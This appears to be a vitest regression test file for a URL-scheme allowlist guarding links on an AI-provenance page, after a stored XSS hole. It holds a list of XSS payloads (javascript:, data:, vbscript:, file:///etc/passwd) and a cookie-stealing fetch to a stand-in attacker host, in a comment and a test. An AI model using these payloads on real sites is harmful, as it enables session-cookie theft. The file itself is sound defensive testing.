import { describe, it, expect } from 'vitest';
import { safeHref, provenancePage } from '../../src/services/ai-provenance-page.js';
import type { AiProvenance } from '../../src/models/ai-provenance-schemas.js';

/**
 * THE HOLE THIS FILE IS THE MEMORY OF.
 *
 * The readable provenance page rendered each source as `<a href="${esc(s.url)}">`. esc() stops a
 * value breaking OUT of the attribute; it says nothing about what the attribute then MEANS, and
 * `javascript:fetch("https://evil/"+document.cookie)` survives escaping intact. The schema did not
 * help: zod's `.url()` validates that a string parses, and every dangerous scheme parses.
 *
 * The path was short and the platform drives people down it: anyone who can publish an app declares
 * `ai_provenance.sources[].url`, the node injects the compliance chip into their app, and the chip's
 * "how this was made" link sends a visitor to the APEX — where the session cookie lives.
 *
 * Escaping and scheme are two different jobs. These tests are about the second one.
 */
const base = (sources: unknown[]): AiProvenance => ({
  spec: 'aimeat.provenance/v1',
  level: 'synthesized',
  humanInvolvement: 'none',
  generatedAt: '2026-08-02T00:00:00.000Z',
  sources,
  disclosure: {
    required: true, reason: 'art50_4_precautionary', strength: 'full',
    short: { en: 'AI-generated' }, long: { en: 'Written by AI.' },
  },
} as unknown as AiProvenance);

const render = (sources: unknown[]) => provenancePage(base(sources), {
  baseUrl: 'https://aimeat.io', locale: 'en', recordUrl: 'https://aimeat.io/v1/provenance/abc',
});

describe('safeHref', () => {
  it('permits the two web schemes and nothing else', () => {
    expect(safeHref('https://example.com/a')).toContain('https://example.com/a');
    expect(safeHref('http://example.com/a')).toContain('http://example.com/a');
  });

  const hostile = [
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    '  javascript:alert(1)  ',
    'java\tscript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
  ];
  for (const u of hostile) {
    it(`refuses ${JSON.stringify(u)}`, () => {
      expect(safeHref(u)).toBeNull();
    });
  }

  it('refuses what is not a string, and what does not parse', () => {
    expect(safeHref(undefined)).toBeNull();
    expect(safeHref(null)).toBeNull();
    expect(safeHref(42)).toBeNull();
    expect(safeHref('/relative/path')).toBeNull();
    expect(safeHref('')).toBeNull();
  });

  it('ALLOWLISTS rather than rewrites — it never returns a cleaned-up version of a bad input', () => {
    // The failure mode being ruled out: stripping "javascript:" and keeping the rest.
    expect(safeHref('javascript:https://example.com')).toBeNull();
  });
});

describe('the page never emits a non-http(s) href', () => {
  it('renders a hostile source as TEXT, with no anchor', () => {
    const html = render([{ url: 'javascript:fetch("https://evil.example/"+document.cookie)' }]);
    expect(html).not.toMatch(/<a[^>]+href="javascript:/i);
    // ...and it is still SHOWN. The record is evidence; hiding part of what it says would be the
    // same failure in the other direction.
    expect(html).toContain('javascript:fetch');
    expect(html).toContain('badhref');
  });

  it('renders an ordinary source as a link with the safe rel', () => {
    const html = render([{ url: 'https://example.com/story', title: 'A story' }]);
    expect(html).toContain('href="https://example.com/story"');
    expect(html).toContain('rel="noopener noreferrer nofollow"');
    expect(html).toContain('A story');
  });

  it('a hostile source alongside a good one does not poison the good one', () => {
    const html = render([
      { url: 'https://good.example/a', title: 'Good' },
      { url: 'javascript:alert(1)' },
    ]);
    expect(html).toContain('href="https://good.example/a"');
    expect(html).not.toMatch(/href="javascript:/i);
  });

  it('a hostile TITLE cannot break out either — esc() still does its own job', () => {
    const html = render([{ url: 'https://ok.example/a', title: '</a><script>alert(1)</script>' }]);
    expect(html).not.toContain('<script>alert(1)</script>');
    expect(html).toContain('&lt;script&gt;');
  });

  it('every href in the rendered document is http(s) or a same-node link', () => {
    const html = render([
      { url: 'javascript:alert(1)' },
      { url: 'data:text/html,<script>alert(1)</script>' },
      { url: 'https://fine.example/x' },
    ]);
    const hrefs = [...html.matchAll(/href="([^"]*)"/g)].map(m => m[1]);
    expect(hrefs.length).toBeGreaterThan(0);
    for (const h of hrefs) {
      expect(h).toMatch(/^https?:\/\//);
    }
  });
});
